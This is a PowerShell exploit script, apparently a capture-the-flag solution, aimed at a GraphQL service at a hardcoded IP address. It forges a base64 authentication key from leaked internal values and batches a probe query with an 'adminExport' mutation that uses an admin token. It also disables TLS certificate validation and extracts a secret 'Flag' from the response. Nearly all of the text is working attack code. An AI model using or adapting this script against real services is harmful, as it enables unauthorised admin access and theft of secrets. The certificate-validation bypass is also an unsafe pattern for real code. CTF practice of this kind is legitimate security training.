# ================
# Exploit Script
# ================

# Intializing Values
$internalKey  = 'INTKEY-fsSIQRtiFeDs'  
$adminToken   = 'secret-token'         
$targetId     = 'b1'
$secretSuffix = 's3cr3tS'

# Target host
$targetHost = 'http://44.198.157.22:4000'

# Build base64 key that backend is expecting
$expectedPlain  = "$internalKey`:$targetId`:$secretSuffix"
$expectedBase64 = [Convert]::ToBase64String(
    [System.Text.Encoding]::UTF8.GetBytes($expectedPlain)
)

# Construct GraphQL batch request
$batch = @(
  @{
    query = 'query P($f:String!){ probe(field:$f) }'
    variables = @{ f = 'internalKeyHint' }
  },
  @{
    query = 'mutation Admin($input: JSON){ adminExport(input: $input) }'
    variables = @{
      input = @{
        auth = @{ token = $adminToken }
        action = 'EXPORT'
        payload = @{
          meta = @{ key = $expectedBase64 }
          targetId = $targetId
        }
      }
    }
  }
) | ConvertTo-Json -Depth 12

# Optional for SSL validation bypass (harmless for localhost)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

Write-Host "`n[*] Sending GraphQL exploit batch to $targetHost/graphql ...`n"

try {
    # Send POST request to local GraphQL endpoint
    $res = Invoke-RestMethod -Method Post -Uri "$targetHost/graphql" `
        -Body $batch -ContentType 'application/json'

    # Display formatted JSON response
    $res | ConvertTo-Json -Depth 20

    # Extract secret from response if present
    if ($res.Length -ge 2 -and $res[1].data -and $res[1].data.adminExport) {
        Write-Host "`Flag: " -NoNewline
        Write-Host $res[1].data.adminExport.backup.secret -ForegroundColor Yellow
    } else {
        Write-Host "`n Failed to extract Flag. Check internalKey and adminToken above." `
            -ForegroundColor Red
    }
}
catch {
    Write-Host "`n[!] Request failed: $($_.Exception.Message)" -ForegroundColor Red
}
